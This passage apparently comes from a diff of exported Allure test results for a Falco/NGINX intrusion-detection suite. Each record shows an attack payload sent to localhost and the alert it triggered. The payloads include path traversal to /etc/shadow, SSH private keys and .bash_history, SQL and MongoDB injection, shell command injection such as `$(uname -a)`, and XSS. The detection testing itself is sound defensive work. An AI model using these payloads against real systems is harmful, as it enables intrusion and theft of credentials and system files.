+- **Detection Count**: 1 / 1
+- **Latency**: ~9000ms
+- **Timestamp**: 15:09:28.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1765465768345-i1xjk4 pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:28.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1765465768345-i1xjk4 pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1
+```","1","test_e2e_with_logs[068_PATH_DOT_008]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_003` |
+| **Name** | SQL Server WAITFOR DELAY |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `WAITFOR DELAY '0:0:5'`
+- **Encoded**: `WAITFOR%20DELAY%20%270%3A0%3A5%27`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~24000ms
+- **Timestamp**: 15:09:13.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_003-1765465753332-ev1dx9 pattern_id=SQLI_TIME_003 uri=/?q=WAITFOR%20DELAY%20%270%3A0%3A5%27 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:13.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_003-1765465753332-ev1dx9 pattern_id=SQLI_TIME_003 uri=/?q=WAITFOR%20DELAY%20%270%3A0%3A5%27 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[012_SQLI_TIME_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_004` |
+| **Name** | Alternative boolean condition |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `' OR 'a'='a`
+- **Encoded**: `%27%20OR%20%27a%27%3D%27a`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~16000ms
+- **Timestamp**: 15:09:21.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1765465761354-5epcbe pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:21.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1765465761354-5epcbe pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[004_SQLI_BOOL_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_017` |
+| **Name** | Backtick command substitution |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: ``id``
+- **Encoded**: `%60id%60`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~2000ms
+- **Timestamp**: 15:09:35.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BASIC_017-1765465775350-duf7k pattern_id=CMD_BASIC_017 uri=/?q=%60id%60 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:35.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BASIC_017-1765465775350-duf7k pattern_id=CMD_BASIC_017 uri=/?q=%60id%60 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[091_CMD_BASIC_017]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `EMRG_MONGO_001` |
+| **Name** | MongoDB $where JavaScript injection |
+| **Category** | OTHER |
+| **Subcategory** | mongodb_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `{""$where"": ""this.username == 'admin'""}`
+- **Encoded**: `%7B%22%24where%22%3A%20%22this.username%20%3D%3D%20%27admin%27%22%7D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_001-1765465772329-wpg8na pattern_id=EMRG_MONGO_001 uri=/?q=%7B%22%24where%22%3A%20%22this.username%20%3D%3D%20%27admin%27%22%7D client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_001-1765465772329-wpg8na pattern_id=EMRG_MONGO_001 uri=/?q=%7B%22%24where%22%3A%20%22this.username%20%3D%3D%20%27admin%27%22%7D client=127.0.0.1
+```","1","test_e2e_with_logs[096_EMRG_MONGO_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_002` |
+| **Name** | Shadow file access via path traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `../../etc/shadow`
+- **Encoded**: `../../etc/shadow`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1765465765337-khwxl pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1765465765337-khwxl pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1
+```","1","test_e2e_with_logs[062_PATH_DOT_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_006` |
+| **Name** | URL encoded SLEEP function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP%285%29`
+- **Encoded**: `SLEEP%25285%2529`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~23000ms
+- **Timestamp**: 15:09:14.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_006-1765465754837-uwrzgw pattern_id=SQLI_TIME_006 uri=/?q=SLEEP%25285%2529 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:14.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_006-1765465754837-uwrzgw pattern_id=SQLI_TIME_006 uri=/?q=SLEEP%25285%2529 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[015_SQLI_TIME_006]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_003` |
+| **Name** | Hosts file access via path traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../etc/hosts`
+- **Encoded**: `../../../etc/hosts`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1765465765838-dqmw9e pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1765465765838-dqmw9e pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
+```","1","test_e2e_with_logs[063_PATH_DOT_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ABS_005` |
+| **Name** | Process environment variables access |
+| **Category** | PATH |
+| **Subcategory** | absolute_paths |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `/proc/self/environ`
+- **Encoded**: `/proc/self/environ`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~6000ms
+- **Timestamp**: 15:09:31.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1765465771852-rvrgsg pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:31.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1765465771852-rvrgsg pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1
+```","1","test_e2e_with_logs[055_PATH_ABS_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_001` |
+| **Name** | Password file access via dot-dot-slash |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `../etc/passwd`
+- **Encoded**: `../etc/passwd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_001-1765465764835-wy5d3j pattern_id=PATH_DOT_001 uri=/?q=../etc/passwd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_001-1765465764835-wy5d3j pattern_id=PATH_DOT_001 uri=/?q=../etc/passwd client=127.0.0.1
+```","1","test_e2e_with_logs[061_PATH_DOT_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_002` |
+| **Name** | MySQL BENCHMARK function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `BENCHMARK(1000000,MD5('test'))`
+- **Encoded**: `BENCHMARK%281000000%2CMD5%28%27test%27%29%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~25000ms
+- **Timestamp**: 15:09:12.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_002-1765465752830-gpu53e pattern_id=SQLI_TIME_002 uri=/?q=BENCHMARK%281000000%2CMD5%28%27test%27%29%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:12.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_002-1765465752830-gpu53e pattern_id=SQLI_TIME_002 uri=/?q=BENCHMARK%281000000%2CMD5%28%27test%27%29%29 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[011_SQLI_TIME_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_006` |
+| **Name** | Apache log file access |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `MEDIUM` |
+
+## Attack Details
+
+- **Payload**: `../../var/log/apache2/access.log`
+- **Encoded**: `../../var/log/apache2/access.log`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~10000ms
+- **Timestamp**: 15:09:27.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_006-1765465767343-4aoktd pattern_id=PATH_DOT_006 uri=/?q=../../var/log/apache2/access.log client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:27.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_006-1765465767343-4aoktd pattern_id=PATH_DOT_006 uri=/?q=../../var/log/apache2/access.log client=127.0.0.1
+```","1","test_e2e_with_logs[066_PATH_DOT_006]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_012` |
+| **Name** | Double pipe OR operator |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `||ls`
+- **Encoded**: `%7C%7Cls`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1765465772843-pbd5dh pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1765465772843-pbd5dh pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1
+```","1","test_e2e_with_logs[086_CMD_BASIC_012]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_SEMICOLON_001` |
+| **Name** | Semicolon command separator with ls |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `; ls -la`
+- **Encoded**: `%3B%20ls%20-la`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~10000ms
+- **Timestamp**: 15:09:27.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_SEMICOLON_001-1765465767329-0a35va pattern_id=CMD_BASIC_SEMICOLON_001 uri=/?q=%3B%20ls%20-la client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:27.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_SEMICOLON_001-1765465767329-0a35va pattern_id=CMD_BASIC_SEMICOLON_001 uri=/?q=%3B%20ls%20-la client=127.0.0.1
+```","1","test_e2e_with_logs[095_CMD_BASIC_SEMICOLON_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_018` |
+| **Name** | Dollar-paren command substitution |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `$(uname -a)`
+- **Encoded**: `%24(uname%20-a)`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~2000ms
+- **Timestamp**: 15:09:35.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1765465775851-u3h1pc pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:35.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1765465775851-u3h1pc pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1
+```","1","test_e2e_with_logs[092_CMD_BASIC_018]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_004` |
+| **Name** | Background execution with ps |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `& ps aux`
+- **Encoded**: `%26%20ps%20aux`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~9000ms
+- **Timestamp**: 15:09:28.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1765465768833-26lcf pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:28.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1765465768833-26lcf pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1
+```","1","test_e2e_with_logs[078_CMD_BASIC_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_002` |
+| **Name** | Image onerror XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<img src=x onerror=alert('XSS')>`
+- **Encoded**: `%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~20000ms
+- **Timestamp**: 15:09:17.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1765465757831-cn4mjn pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:17.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1765465757831-cn4mjn pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[037_XSS_REFL_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_002` |
+| **Name** | Boolean injection with comment |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `' OR 1=1 --`
+- **Encoded**: `%27%20OR%201%3D1%20--`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~17000ms
+- **Timestamp**: 15:09:20.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_002-1765465760352-vym6cw pattern_id=SQLI_BOOL_002 uri=/?q=%27%20OR%201%3D1%20-- client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_002-1765465760352-vym6cw pattern_id=SQLI_BOOL_002 uri=/?q=%27%20OR%201%3D1%20-- client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[002_SQLI_BOOL_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_007` |
+| **Name** | SUBSTRING-based boolean injection |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `' AND SUBSTRING(username,1,1)='a`
+- **Encoded**: `'%20AND%20SUBSTRING(username%2C1%2C1)%3D'a`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1765465764362-bvzln pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1765465764362-bvzln pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[007_SQLI_BOOL_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_004` |
+| **Name** | Apache config access via traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../../etc/apache2/apache2.conf`
+- **Encoded**: `../../../../etc/apache2/apache2.conf`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~11000ms
+- **Timestamp**: 15:09:26.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_004-1765465766340-nrz2gd pattern_id=PATH_DOT_004 uri=/?q=../../../../etc/apache2/apache2.conf client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:26.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_004-1765465766340-nrz2gd pattern_id=PATH_DOT_004 uri=/?q=../../../../etc/apache2/apache2.conf client=127.0.0.1
+```","1","test_e2e_with_logs[064_PATH_DOT_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_009` |
+| **Name** | SSH private key access |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `../../home/user/.ssh/id_rsa`
+- **Encoded**: `../../home/user/.ssh/id_rsa`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~9000ms
+- **Timestamp**: 15:09:28.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1765465768846-l0yhel pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:28.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1765465768846-l0yhel pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1
+```","1","test_e2e_with_logs[069_PATH_DOT_009]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_016` |
+| **Name** | OR operator with id |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `|| id`
+- **Encoded**: `%7C%7C%20id`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~3000ms
+- **Timestamp**: 15:09:34.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_016-1765465774848-kcs7n pattern_id=CMD_BASIC_016 uri=/?q=%7C%7C%20id client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:34.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_016-1765465774848-kcs7n pattern_id=CMD_BASIC_016 uri=/?q=%7C%7C%20id client=127.0.0.1
+```","2","test_e2e_with_logs[090_CMD_BASIC_016]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_014` |
+| **Name** | Sleep with inline comment |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP(/*5*/5)`
+- **Encoded**: `SLEEP%28/%2A5%2A/5%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~19000ms
+- **Timestamp**: 15:09:18.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1765465758848-hawtv pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:18.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1765465758848-hawtv pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[023_SQLI_TIME_014]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_012` |
+| **Name** | onclick event handler injection |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<div onclick=alert(1)>click</div>`
+- **Encoded**: `%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1765465762843-o2064l pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:22.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_012-1765465762843-o2064l pattern_id=XSS_REFL_012 uri=/?q=%3Cdiv%20onclick%3Dalert(1)%3Eclick%3C%2Fdiv%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[047_XSS_REFL_012]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_BASIC_003` |
+| **Name** | Triple parent directory traversal |
+| **Category** | PATH |
+| **Subcategory** | basic_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../`
+- **Encoded**: `../../../`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1765465763331-kp8lmc pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1765465763331-kp8lmc pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1
+```","1","test_e2e_with_logs[058_PATH_BASIC_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_001` |
